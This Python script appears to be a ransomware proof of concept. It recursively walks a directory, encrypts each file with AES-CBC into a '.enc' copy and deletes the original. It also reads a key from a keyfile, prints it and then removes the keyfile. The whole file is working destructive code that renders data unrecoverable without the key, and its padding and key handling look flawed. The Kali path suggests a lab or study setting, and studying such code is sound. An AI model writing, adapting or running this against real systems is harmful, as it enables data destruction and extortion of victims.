import os, random, struct, string, subprocess
from Crypto.Cipher import AES

def encrypt_file(key, in_filename, out_filename=None, chunksize=64 * 1024):
    # Generation of the output file name
    if not out_filename:
        out_filename = in_filename + '.enc'
    # Generation of the IV
    iv = os.urandom(16)
    # Cyphering section
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))
    os.remove(in_filename)
    return out_filename

# RUNNING SECTION
# Reading the keyfile
with open('keyfile.key', 'r') as file:
    password = file.read().replace('\n', '')
print(password)
# Removing the keyfile
os.remove("keyfile.key")
# Encrypt all the data from /data (can be changed to anything)
for subdir, dirs, files in os.walk(r'/home/kali/Desktop/POCcrypto/main'):
    for filename in files:
        filepath = subdir + os.sep + filename
        print (filepath)
        encrypt_file(password,filepath)
